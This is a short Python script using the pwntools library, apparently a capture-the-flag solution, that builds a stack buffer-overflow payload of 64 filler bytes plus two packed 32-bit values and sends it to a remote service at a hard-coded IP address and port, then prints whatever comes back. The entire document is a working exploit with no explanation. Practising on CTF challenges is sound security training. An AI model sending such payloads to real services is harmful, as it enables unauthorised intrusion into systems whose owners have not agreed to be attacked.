#!/usr/bin/env python3
from pwn import *

payload = b"A" * 64 + p32(21)  + p32(64)  

host, port = "91.77.163.113", 9000

p = remote(host, port)
log.info(p.recvS())         
p.sendline(payload)         
log.success(p.recvallS())   
p.close()
